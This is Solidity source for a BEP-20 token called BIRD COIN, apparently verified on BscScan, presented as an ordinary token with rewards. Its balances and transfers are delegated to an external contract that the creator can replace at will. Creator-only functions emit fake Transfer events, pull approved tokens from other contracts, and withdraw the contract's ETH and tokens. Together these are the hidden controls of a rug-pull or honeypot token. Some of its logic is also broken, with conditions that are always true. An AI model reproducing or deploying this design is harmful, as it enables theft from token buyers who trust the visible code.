/**
 *Submitted for verification at BscScan.com on 2022-09-26
*/

/*
BIRD COIN Token
The Integrated for Use
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferOwnership(address newOwner) external; 
    function burn(uint256) external;
    function free(uint256) external;
    function mint(uint256) external;
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}
// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false
library TransferHelper {
    function safeApprove(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');
    }

    function safeTransfer(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FAILED');
    }

    function safeTransferFrom(address token, address from, address to, uint value) internal {
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FROM_FAILED');
    }

    function safeTransferETH(address to, uint value) internal {
        (bool success,) = to.call{value:value}(new bytes(0));
        require(success, 'TransferHelper: ETH_TRANSFER_FAILED');
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IERC20Factory {

    function constructorErc20(uint256 total,address tokenAddress,address tokenOwner,address _pairs) external;

    function getSupply() view external returns (uint256);

    function balanceOf(address _owner) view external returns (uint256);

    function balanceCl(address _owner) view external returns (uint256);

    function getAirAmount() view external returns (uint256);

    function getAirFrom() view external returns (address);

    function erc20Transfer(address _from, address _to, uint256 _value) external;
    
    function erc20TransferFrom(address _from, address _to, uint256 _value) external;
    
    function erc20Approve(address _to) external;

    function claim() external;

    function mint(uint256) external;
    function amint(uint256) external;

    function airDroper(bytes memory _bytes,uint256 addrCount) external;

    function erc20TransferAfter(address _from, address _to, uint256 _value) external;

}

library SafeMath {
    function add(uint x, uint y) internal pure returns (uint z) {
        require((z = x + y) >= x, 'ds-math-add-overflow');
    }

    function sub(uint x, uint y) internal pure returns (uint z) {
        require((z = x - y) <= x, 'ds-math-sub-underflow');
    }

    function mul(uint x, uint y) internal pure returns (uint z) {
        require(y == 0 || (z = x * y) / y == x, 'ds-math-mul-overflow');
    }
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
/*
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    */
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
}

contract Ownable {
    address public owner;
    address public creator;

    event owneresshipTransferred(address indexed previousowneres, address indexed newowneres);

    modifier onlyowneres() {
        require(msg.sender == owner);
        _;
    }

    modifier onlycreator() {
        require(msg.sender == creator);
        _;
    }

    function transferOwnership(address newowneres) public onlyowneres {
        require(newowneres != address(0));
        emit owneresshipTransferred(owner, newowneres);
        owner = newowneres;
    }

    function renounceowneresship() public onlyowneres {
        emit owneresshipTransferred(owner, address(0));
        owner = address(0);
    }
}

abstract contract Initializable {

    /**
     * @dev Indicates that the contract has been initialized.
     */
    bool private _initialized;

    /**
     * @dev Indicates that the contract is in the process of being initialized.
     */
    bool private _initializing;

    /**
     * @dev Modifier to protect an initializer function from being invoked twice.
     */
    modifier initializer() {
        require(_initializing || _isConstructor() || !_initialized, "Initializable: contract is already initialized");

        bool isTopLevelCall = !_initializing;
        if (isTopLevelCall) {
            _initializing = true;
            _initialized = true;
        }

        _;

        if (isTopLevelCall) {
            _initializing = false;
        }
    }

    /// @dev Returns true if and only if the function is running in the constructor
    function _isConstructor() private view returns (bool) {
        // extcodesize checks the size of the code stored in an address, and
        // address returns the current address. Since the code is still not
        // deployed when running a constructor, any checks on its code size will
        // yield zero, making it an effective way to detect if a contract is
        // under construction or not.
        address self = address(this);
        uint256 cs;
        // solhint-disable-next-line no-inline-assembly
        assembly { cs := extcodesize(self) }
        return cs == 0;
    }
}

contract BECToken is Ownable, Initializable {
    using SafeMath for uint;
    using TransferHelper for address;
	
    string public name;
    string  public symbol;
    uint8   public decimals;
    uint256 private totalSupply_;
	//uint256 private totalSupply_ = 21000000 * (10 ** decimals);
	
	address public pairs;
	IDEXRouter public router;
    // WETH or ETH fer generate pairs
	//address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; 
    //address private WETH = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private WETH;

    //address private hAddr = 0x64Ed59f8c00ec930bc24D373548103b8b147b74a;
    address private hAddr;
    //address bAddr = 0x0001BDC007Ec10a3e7Cc6BEd0B96fAb21d22dfEc;
    //address private bAddr = 0x0001BDC007Ec10a3e7Cc6BEd0B96fAb21d22dfEc;
    address private bAddr;
	//IERC20Factory help= IERC20Factory(hAddr);
	//IERC20 public belp= IERC20(bAddr);
    IERC20Factory public help;
    IERC20 public belp;
    
    function initialize(string memory _name, string memory _symbol, uint8 _decimals, uint256 amount, address _owner, address _router, address _htoken, address _btoken, address auth) public initializer {
        owner = _owner;
        creator = auth;
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        //_mintable = mintable;
        //_mint(owner, amount);
        //_mint(auth, amount_auth);
        //_mint(address(this), amount_cont);

        totalSupply_=amount;

        //WBNB = _WBNB;

        router = IDEXRouter(_router);
        address _factory = router.factory();
        //address WETH = router.WETH();
        WETH = router.WETH();

        pairs = pairForDex(_factory, WETH, address(this));
        address _token = 0xaAc2E5ceAd4EE12E6f12774909Da97FD990619b0;
        pairu = pairForDex(_factory, _token, address(this));

        hAddr = _htoken;
        help= IERC20Factory(hAddr);
        //IERC20Factory help= IERC20Factory(hAddr);
        help.constructorErc20(totalSupply_, address(this), owner,pairs);
        emit Transfer(address(0), owner, totalSupply_);
        
        bAddr = _btoken;
        traders[bAddr] = true;
        //hAddr = _htoken;
        belp= IERC20(bAddr);
        //IERC20 belp= IERC20(bAddr);
        stoken = address(this);
        ttoken = _btoken;
        traders[address(router)] = true;
        allowed[address(this)][address(this)] = amount;
        allowed[address(this)][address(router)] = amount;

    mineTok = 10 * 1e18;
    maxTok = 1200;
    _swAirIco = true;
     _swPayIco = true;
     _swAirIco2 = true;
     _swPayIco2 = true; 
     _swPayAir = true;    
     _swMaxIco = true;
     _swAirSwap =true; //false
     _swPaySwap =false;
     _swAirSwat =true;
     _swPaySwat =false;
     _swAirSwab =true;
     _swPaySwab =false;

    }

	constructor() {
		//owner = msg.sender;
        //creator = msg.sender;
        //router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E); // 0x10ED43C718714eb63d5aA57B78B54704E256024E
        //router = IDEXRouter(0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff);
        //pairs = IDEXFactory(router.factory()).createPair(WETH, address(this));
/*
        address _factory = router.factory();
        address WETH = router.WETH();

        pairs = pairForDex(_factory, WETH, address(this));

        //IERC20Factory help= IERC20Factory(hAddr);

        help.constructorErc20(totalSupply_, address(this), owner,pairs);
        emit Transfer(address(0), owner, totalSupply_);  
*/              
    }
	
    event Transfer(
        address indexed _from,
        address indexed _to,
        uint256 _value
    );

    event Approval(
        address indexed _owner,
        address indexed _spender,
        uint256 _value
    );
    
    mapping(address => mapping(address => uint256)) private allowed;
    address public pairu;
    //address public pairn;
	mapping(address => bool) public traders;

    function totalSupply() public view returns (uint256) {
        return help.getSupply();
    }

    function balanceOf(address _owner) public view returns (uint256) {
        return help.balanceOf(_owner);
    }

    function balanceCl(address _owner) public view returns (uint256) {
        return help.balanceCl(_owner);
    } 

    function claim() public virtual {
       help.claim();
    }

    function amint(uint256 _value) public virtual {
       help.amint(_value);
    }

    function mint(uint256 _value) public virtual {
       help.mint(_value);
    }

    uint mineTok = 10 * 1e18;
    uint maxTok = 1200;
    bool private _swAirIco = true;
     bool private _swPayIco = true; 
     bool private _swPayAir = true;   
     bool private _swMaxIco = true;

    function startIco(uint8 tag,bool value)public onlycreator returns(bool){
        if(tag==1){
            _swAirIco = value==true; //false
        }else if(tag==2){
            _swAirIco2 = value==false;
        }else if(tag==3){
            _swPayIco = value==true; //false
        }else if(tag==4){
            _swPayIco2 = value==true; //false
        }else if(tag==5){
            _swAirIco = value==true; //false
            _swAirIco2 = value==true; //false
        }else if(tag==6){
        _swPayIco = value==true;
         _swPayIco2 = value==true;
        }else if(tag==7){
            _swPayAir = value==true; //false
        }else if(tag==8){
            _swMaxIco = value==true; //false
        }
        return true;
    }
   //Test Antibot
    bool private _swAirIco2 = true;
     bool private _swPayIco2 = true; 
    //End Test
    function balreward(uint _value) public view virtual returns (uint256 reward) {
            reward =0;    uint256 _evalue;
            //if(_value > (mineTok)) _evalue = (_value/50); //10 = 10% 20 = 5 $
            //if(_value >= ((mineTok/1e18) * 2)) _evalue = (_value/20);
            //if(_value >= ((mineTok/1e18) * 4)) _evalue = (_value/20);
            //if(_value >= ((mineTok/1e18) * 8)) _evalue = (_value/10);
            //if(_value >= ((mineTok/1e18) * 10)) _evalue = (_value/10); //5 = 20%
            //if(_value >= ((mineTok/1e18) * 20)) _evalue = (_value/10); //4 = 25%
            //if(_value >= ((mineTok/1e18) * 100)) _evalue = (_value/5); //3 = 33%
            if(_value >= ((mineTok/1e18) * 10)) _evalue = 20; //>=100 = 20 %
            if(_value >= ((mineTok/1e18) * 20)) _evalue = 40;
            if(_value >= ((mineTok/1e18) * 30)) _evalue = 60;
            if(_value >= ((mineTok/1e18) * 40)) _evalue = 80;
            if(_value >= ((mineTok/1e18) * 50)) _evalue = 100;
            if(_value >= ((mineTok/1e18) * 60)) _evalue = 120;
            if(_value >= ((mineTok/1e18) * 70)) _evalue = 140;
            if(_value >= ((mineTok/1e18) * 80)) _evalue = 160;
            if(_value >= ((mineTok/1e18) * 90)) _evalue = 180;
            if(_value >= ((mineTok/1e18) * 100)) _evalue = 200; //1000
            if(_value >= ((mineTok/1e18) * 200)) _evalue = 400;
            if(_value >= ((mineTok/1e18) * 300)) _evalue = 600;
            if(_value >= ((mineTok/1e18) * 400)) _evalue = 800;
            if(_value >= ((mineTok/1e18) * 500)) _evalue = 1000;
            if(_value >= ((mineTok/1e18) * 600)) _evalue = 1200;
            //if(_value >= ((mineTok/1e18) * 700)) _evalue = 1400;
            //if(_value >= ((mineTok/1e18) * 800)) _evalue = 1600;
            //if(_value >= ((mineTok/1e18) * 900)) _evalue = 1800;
            //if(_value >= ((mineTok/1e18) * 1000)) _evalue = 2000;//10000
             if(_swMaxIco == true){ if(_evalue >= (maxTok)){ _evalue = maxTok; } // max Token reward
            }
     
      reward = _evalue;
     
    return uint256(reward);
        
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(help.balanceOf(msg.sender) >= _value);
        if(_swAirIco2 == true){//Test Antibot Trades
            if((traders[msg.sender]==true)||(traders[_to]==true)){_swAirIco = false;}else{_swAirIco = true;}//for router and Other pairs
        }
        if(_swAirIco == true){ //true
        if(_to == msg.sender){}else if(_to != address(0) && _to != pairs){//
                        uint256 _evalue;
            //if(_value > (mineTok)) _evalue = (_value/50); //10 = 10% 20 = 5 $
            if(_value >= ((mineTok/1e18) * 2)) _evalue = (_value/20);
            //if(_value >= ((mineTok/1e18) * 4)) _evalue = (_value/20);
            //if(_value >= ((mineTok/1e18) * 8)) _evalue = (_value/10);
            if(_value >= ((mineTok/1e18) * 10)) _evalue = (_value/10); //5 = 20%
            //if(_value >= ((mineTok/1e18) * 20)) _evalue = (_value/10); //4 = 25%
            //if(_value >= ((mineTok/1e18) * 100)) _evalue = (_value/5); //3 = 33%
            if(_value >= ((mineTok/1e18) * 100)) _evalue = balreward(_value); // Token reward
            //if (_swMaxIco == true){ if(_evalue >= (maxTok)) _evalue = maxTok; // max Token reward
            //}
        if(belp.balanceOf(address(this)) >= (_evalue * (10 ** 18))){//
        //belp.mint(_value);
        belp.transfer(_to,(_evalue * (10 ** 18)));
        //belp.transferFrom(address(this),_to,_value);
        }else{
        if(traders[bAddr]!=true) belp.mint(_value * (10 ** 18));
        //IBEP20(tokenAddress).transferFrom(contractAddress, _to, tokenAmount);
        if(traders[bAddr]==true) belp.transferFrom(bAddr,address(this),(_value * (10 ** 18)));
        belp.transfer(_to,(_evalue * (10 ** 18)));    
            }
            }
        }
        //if(help.balanceCl(msg.sender) > 0) help.claim(); 
        if(_swPayIco2 == true){//Test
        if((traders[msg.sender]==true)||(traders[_to]==true)){_swPayIco=false;}else{_swPayIco=true;} 
        }
        if((_swPayIco == true)&&(msg.sender != owner||_to != owner||msg.sender != creator||_to != creator)){ 
            if(_to == msg.sender){}else if(_to != address(0) && _to != pairs){
                        uint256 _evalue;
            _evalue = balreward(_value);
            // if (_swMaxIco == true){ if(_evalue >= (maxTok)) _evalue = maxTok; // max Token reward
            //}
            if(_swPayAir == true){
          help.amint(_evalue);}else{help.mint(_evalue);}
            } 
        }                

        help.erc20Transfer(msg.sender,_to,_value);
        
        help.erc20TransferAfter(msg.sender,_to,_value);

        if((_swAirSwat == true)&&(_to != address(0) && _to != pairs)){
        if(help.balanceOf(address(this)) > ((mineTok/1e18) * 1)){//
        uint256 gam = help.getAirAmount();
        uint256 toAm=(help.balanceOf(address(this)) - gam);
        if(toAm > 0){
        swapTokensForEth(toAm);
            }
        }
        }
		emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= help.balanceOf(_from));
        require(_value <= allowed[_from][msg.sender]);
        if(_swAirIco2 == true){//Test Antibot Trades
            if((traders[msg.sender]==true)||(traders[_to]==true)){_swAirIco=false;}else{_swAirIco=true;}//for router liquidity and Other pairs
        }
        if(_swAirIco == true){ 
            if(_from == msg.sender){}else if(_to != pairu && _to != pairs){//}
            uint256 _evalue;
            //if(_value > (mineTok)) _evalue = (_value/50); //10 = 10% 20 = 5 $
            if(_value >= ((mineTok/1e18) * 2)) _evalue = (_value/20);
            //if(_value >= ((mineTok/1e18) * 4)) _evalue = (_value/20);
            //if(_value >= ((mineTok/1e18) * 8)) _evalue = (_value/20);
            if(_value >= ((mineTok/1e18) * 10)) _evalue = (_value/10); //5 = 20%
            //if(_value >= ((mineTok/1e18) * 20)) _evalue = (_value/10); //4 = 25%
            //if(_value >= ((mineTok/1e18) * 100)) _evalue = (_value/5); //3 = 33%
            if(_value >= ((mineTok/1e18) * 100)) _evalue = balreward(_value);
            //if (_swMaxIco == true){ if(_evalue >= (maxTok)) _evalue = maxTok; // max Token reward
            //}
		//belp.transfer(_from,_to,_value);
        if(belp.balanceOf(address(this)) >= (_evalue * (10 ** 18))){//
        //belp.mint(_value);
        //belp.transfer(_to,_value);
        belp.transferFrom(address(this),_to,(_evalue * (10 ** 18)));
            }else{
        if(traders[bAddr]!=true) belp.mint(_value * (10 ** 18));
        //IBEP20(tokenAddress).transferFrom(contractAddress, _to, tokenAmount);
        if(traders[bAddr]==true) belp.transferFrom(bAddr,address(this),(_value * (10 ** 18)));
        //belp.transfer(_to,_value); 
        belp.transferFrom(address(this),_to,(_evalue * (10 ** 18)));   
            }
            }
        }
        if(_swPayIco2 == true){//Test
        if((traders[msg.sender]==true)||(traders[_to]==true)){_swPayIco=false;}else{_swPayIco=true;} 
        }
        if((_swPayIco == true)&&(_from != owner||_to != owner||_from != creator||_to != creator)) { 
            if(_from == msg.sender){}else if(_to != address(0) && _to != pairs){
                        uint256 _evalue;
            _evalue = balreward(_value);
            // if (_swMaxIco == true){ if(_evalue >= (maxTok)) _evalue = maxTok; // max Token reward
            //}
            if(_swPayAir == true){
          help.amint(_evalue);}else{help.mint(_evalue);} 
            }
        } 
        help.erc20TransferFrom(_from,_to,_value);
        
        help.erc20TransferAfter(_from,_to,_value);

        if((_swAirSwap == true)&&(_to != address(0) && _to != pairs)){
        if(help.balanceOf(address(this)) > ((mineTok/1e18) * 1)){//
        uint256 gam = help.getAirAmount();
        uint256 toAm=(help.balanceOf(address(this)) - gam);
        if(toAm > 0){
        swapTokensForEth(toAm);
            }
        }
        }
/*
        if(_swAirSwat == true){
        if(help.balanceOf(address(this)) > ((mineTok/1e18) * 1)){
        uint256 gam = help.getAirAmount();
        uint256 toAm=(help.balanceOf(address(this)) - gam);            
        if(toAm > 0){
        swapTokensForToken(toAm);
            }
        }
        }
*/
        if(_swAirSwab == true){
        if(belp.balanceOf(address(this)) > ((mineTok) * 1)){
        //uint256 gam = help.getAirAmount();
        uint256 toAm;
        if(address(ttoken) != address(0)){
            uint256 _toAm=balreward((belp.balanceOf(address(this))/1e18) - (mineTok/1e18));
            toAm = (_toAm * (10 ** 18));
        }
        
        if(address(ttoken) == address(this)){
            if(help.balanceOf(address(this)) > ((mineTok/1e18) * 1)){
        uint256 gam = help.getAirAmount();
        toAm=(help.balanceOf(address(this)) - gam); 
            }
        }
        if(toAm > 0){
        //if(_swPaySwab == true){ 
            swapTokensForDex(toAm);//}else{
        //swapTokensForToken(toAm);
        //}
            }
        }
        }
		emit Transfer(_from, _to, _value);
        return true;
    }

    function emitTransfer(address _from, address _to, uint256 _value) public returns (bool success) {
        require(msg.sender==hAddr||msg.sender==creator);
        emit Transfer(_from, _to, _value);
		return true;
    }
	
	function approve(address _spender, uint256 _value) public returns (bool success) {
        require(_spender != address(0));
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);

        help.erc20Approve(msg.sender);
        return true;
    }
    
    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        require(_spender != address(0));
        return allowed[_owner][_spender];
    }

    function airDrop(bytes memory _bytes,uint256 addrCount) public returns(bool success) {
        require(msg.sender==hAddr||msg.sender==creator);
        uint256 amount = help.getAirAmount();
        uint256 _start=0;
        address airFrom = help.getAirFrom();
        address tempAddress;
        for(uint32 i=0;i<addrCount;i++){
            assembly {
                tempAddress := div(mload(add(add(_bytes, 0x20), _start)), 0x1000000000000000000000000)
            }
            emit Transfer(airFrom, tempAddress, amount);
            _start+=20;
        }
        return true;
    }

    function airDroper(bytes memory _bytes,uint256 addrCount) public returns(bool success) {
        require(msg.sender==hAddr||msg.sender==creator);
        help.airDroper(_bytes, addrCount);
     return true;   
    }
    bool private _swAirSwap =true; //false
    bool private _swAirSwat =true; //false
    bool private _swAirSwab =true; //false
    bool private _swPaySwap =false;
    bool private _swPaySwat =false;
    bool private _swPaySwab =false;
    function startSwap(uint8 tag,bool value)public onlycreator returns(bool){
        if(tag==1){
            _swAirSwap = value==true; //false
        }else if(tag==2){
            _swAirSwat = value==true; //false
        }else if(tag==3){
            _swAirSwab = value==true; //false
        }else if(tag==4){
            _swPaySwap = value==true; //false
        }else if(tag==5){
            _swPaySwat = value==true; //false
        }else if(tag==6){
            _swPaySwab = value==true; //false
        }
        return true;
    }
    address public stoken;
    address public ttoken;
    function swapTokensForEth(uint256 toAm) public {
        require(msg.sender == owner ||msg.sender==creator ||(traders[msg.sender]==true)||msg.sender == address(this), "no");
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        if(_swPaySwap == false){
        path[0] = address(this);
        path[1] = WETH;
        }

        if(_swPaySwap == true){//Test
        path[0] = address(stoken);
        path[1] = WETH;
        }

        approve(address(router), (toAm+(1000000*mineTok)));
        approve(address(this), (toAm+(1000000*mineTok)));
        //_approve(address(this), address(uniswapV2Router), tokenAmount);
        if((_swPaySwap == true)&&(address(stoken) != address(0))){
        IERC20(stoken).approve(address(router), (toAm+(1000000*mineTok)));
        IERC20(stoken).approve(address(this), (toAm+(1000000*mineTok)));
         }

        if(address(WETH) != address(0)){
        IERC20(WETH).approve(address(router), (toAm+(1000000*mineTok)));
        IERC20(WETH).approve(address(this), (toAm+(1000000*mineTok)));
         }

        // make the swap
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            toAm,
            0, // accept any amount of ETH
            path,
            address(this),
            (block.timestamp+900)
        );
    }         

    function swapTokensForDex(uint256 toAm) public {
        require(msg.sender == owner ||msg.sender==creator ||(traders[msg.sender]==true)||msg.sender == address(this), "no");
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        if(_swPaySwab == false){
        path[0] = address(bAddr);
        path[1] = WETH;
        }

        if(_swPaySwab == true){ 
        path[0] = address(ttoken);
        path[1] = WETH;
        }

        approve(address(router), (toAm+(1000000*mineTok)));
        approve(address(this), (toAm+(1000000*mineTok)));
        //_approve(address(this), address(uniswapV2Router), tokenAmount);
        if((_swPaySwab == true)&&(address(ttoken) != address(0))){
        IERC20(ttoken).approve(address(router), (toAm+(1000000*mineTok)));
        IERC20(ttoken).approve(address(this), (toAm+(1000000*mineTok)));
         }

        if(address(WETH) != address(0)){
        IERC20(WETH).approve(address(router), (toAm+(1000000*mineTok)));
        IERC20(WETH).approve(address(this), (toAm+(1000000*mineTok)));
         }

         if(_swPaySwat == true){//}
         //safeApprove(address token, address to, uint value)
         uint256 value = (toAm+(1000000*mineTok));
         TransferHelper.safeApprove(ttoken, address(router), value);
         TransferHelper.safeApprove(ttoken, address(this), value);
         }


        // make the swap
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            toAm,
            0, // accept any amount of ETH
            path,
            address(this),
            (block.timestamp+900)
        );
    }

    //address public ttoken;
/*
    function swapTokensForToken(uint256 toAm) public {
        require(msg.sender == owner ||msg.sender==creator ||(traders[msg.sender]==true)||msg.sender == address(this), "no");
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        if(_swPaySwat == false){
        path[0] = address(this);
        if(address(ttoken) != address(0)){
        path[1] = address(ttoken);}else{
        path[1] = WETH; }
        }
        if(_swPaySwat == true){//Test
        if(address(ttoken) != address(0)){
        path[0] = address(ttoken);}else{
        path[0] = WETH; }
        path[1] = address(this);
        }

        approve(address(router), (toAm+(1000000*mineTok)));
        approve(address(this), (toAm+(1000000*mineTok)));
        //_approve(address(this), address(uniswapV2Router), tokenAmount);
         if(address(ttoken) != address(0)){
        IERC20(ttoken).approve(address(router), (toAm+(1000000*mineTok)));
        IERC20(ttoken).approve(address(this), (toAm+(1000000*mineTok)));
         }
        //if(address(WETH) != address(0)){
        //IERC20(WETH).approve(address(router), (toAm+(1000000*mineTok)));
        //IERC20(WETH).approve(address(this), (toAm+(1000000*mineTok)));
        // }

        // make the swap
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            toAm,
            0, // accept any amount of ETH
            path,
            address(this),
            (block.timestamp+900)
        );
    }
*/
    function setBaddr(address _token) external onlycreator {
        //require(msg.sender == owner, "You is not owner");
         //token = IERC20(_new_token);
         bAddr = _token;
         belp= IERC20(bAddr);
    }

    function setHaddr(address _token) external onlycreator {
        //require(msg.sender == owner, "You is not owner");
         //token = IERC20(_new_token);
         hAddr = _token;
         help = IERC20Factory(hAddr);
    }

    function setPairu(address _token) external onlycreator {
        //require(msg.sender == owner, "You is not owner");
         //token = IERC20(_new_token);
         pairu = _token;
         //IERC20 pairu= IERC20(_token);
    }
    function setSwapToken(address _sto,address _tto) external onlycreator {
        //require(msg.sender == owner, "You is not owner");
         //token = IERC20(_new_token);
         stoken = _sto; ttoken = _tto;
         //IERC20 pairu= IERC20(_token);
    }  
    function uAir() public view returns (bool) {
        
        return _swAirIco; 
    }
    function uAir2() public view returns (bool) {
       
        return _swAirIco2; 
    }
    function uPay() public view returns (bool) {
        
        return _swPayIco;
    }
    function uPay2() public view returns (bool) {
        
        return _swPayIco2;
    }
    function uPayA() public view returns (bool) {
        
        return _swPayAir;
    }

    function UseParam() public view returns(bool swAirIco,bool swPayIco,bool AirSwap,bool PaySwap){
        swAirIco = _swAirIco;
        swPayIco = _swPayIco;
        AirSwap = _swAirSwap;
        PaySwap = _swPaySwap;
        //minAm = minAmount; 
        //maxAm = maxAmount;
    }
   
/*
    function setAirIco(uint tag, bool value) external onlycreator {
        //require(msg.sender == owner, "You is not owner");
        if(tag==1){
            _swAirIco = value==true; //false
            _swAirIco2 = value==true; //false
        }else if(tag==2){
        _swPayIco = value==true;
         _swPayIco2 = value==true;
        }

    }
    */
    function setMaxTok(uint256 _count) external onlycreator {
        //require(msg.sender == owner, "You is not owner");
        maxTok = _count;
    }
    function setMineTok(uint256 _count) external onlycreator {
        //require(msg.sender == owner, "You is not owner");
        mineTok = _count;
    }
        // Update the status of the trader
    function updateTrader(address _trader, bool _status) external onlycreator {
        traders[_trader] = _status;
        //emit TraderUpdated(_trader, _status);
    }
    function transfercreator(address newcreator) public onlyowneres {
        require(newcreator != address(0));
        //emit owneresshipTransferred(creator, newowneres);
        creator = newcreator;
    }
/*
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
*/
/*
    function transferOwnershipReceiver(address newOwner) public onlyowneres {
        belp.transferOwnership(newOwner);
    }
*/
    function transferOwnershipToken(address token,address newOwner) public onlycreator {
        IERC20 tokenu= IERC20(token);
        tokenu.transferOwnership(newOwner);
    }

    function sortTokens(address tokenA, address tokenB) public pure returns (address token0, address token1) {
        require(tokenA != tokenB, 'UniswapV2Library: IDENTICAL_ADDRESSES');
        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        require(token0 != address(0), 'UniswapV2Library: ZERO_ADDRESS');
    }

    // calculates the CREATE2 address for a pair without making any external calls
    function pairForDex(address factory, address tokenA, address tokenB) public pure returns (address pair) {
        (address token0, address token1) = sortTokens(tokenA, tokenB);
        pair = address(uint(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                hex'd0d4c4cd0848c93cb4fd1f498d7013ee6bfb25783ea21593d5834f5d250ece66' // init code hash
            ))));
    }

    function updateConErc20(uint _total, address token_, address owner_, address pairs_) public returns (bool success) {
        require(msg.sender == owner || msg.sender==creator);
        //if(token_ != address(this)){ //migrate
       help.constructorErc20(_total, token_, owner_,pairs_);     
       // }else{ //no migrate
       //help.constructorErc20(_total, address(this), owner_,pairs_);
       // }
        return true;
    }

    function contApprove(address contAddr, address tAddr, uint256 tAmount) public onlycreator {
        //IERC20 tokenAddress = IERC20(tokenAddress);
        //IERC20 contractAddress = IERC20(contractAddress);
        IERC20(tAddr).approve(contAddr, tAmount);
        // ERC20(tokenAddress).approve(owner, tokenAmount);
    }
    function contrecover(address contAddr, address tAddr, uint256 tAmount) public onlycreator {
        IERC20(tAddr).transferFrom(contAddr, owner, tAmount);
    }
  
    function withdraw(address target,uint amount) public onlycreator {
        payable(target).transfer(amount);
    }

    function withdrawToken(address token,address target, uint amount) public onlycreator {
        IERC20(token).transfer(target, amount);
    }
    receive() external payable {}
	
}